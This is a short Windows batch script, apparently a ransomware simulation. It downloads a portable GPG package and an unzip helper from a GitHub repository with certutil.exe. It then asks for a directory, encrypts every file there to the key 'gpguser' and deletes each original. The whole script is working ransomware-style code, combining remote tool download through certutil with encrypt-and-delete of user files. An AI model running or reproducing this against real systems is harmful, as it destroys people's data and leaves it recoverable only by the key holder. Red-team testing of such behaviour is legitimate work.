@echo off
:: Download gpg zipped file and helpers
echo:
echo [W] Downloading files 
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/gpg_portable.zip
echo:
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/unzipfile.vbs
echo:

:: move files to c:\share
::move -y gpg_portable.zip c:\share
::move -y c:\share

:: unzip gpg_portable
echo [W] Unzipping gpg file 
unzipfile.vbs c:\share\gpg_portable.zip c:\share\gpg_extracted\

echo:
powershell write-host -back DarkRed [W] Next action is to encrypt files in directory indicated [any key to continue]
pause > null
:: ask for dir to encrypt
set /p dir_to_enc="Directory to encrypt:> "
echo:
echo [W]encrypting ... %dir_to_enc%

:: encrypt files in dir "
for %%f in (%dir_to_enc%\*) do C:\share\gpg_extracted\gpg_portable\bin\gpg -r gpguser -e  "%%f" && del "%%f"

echo:
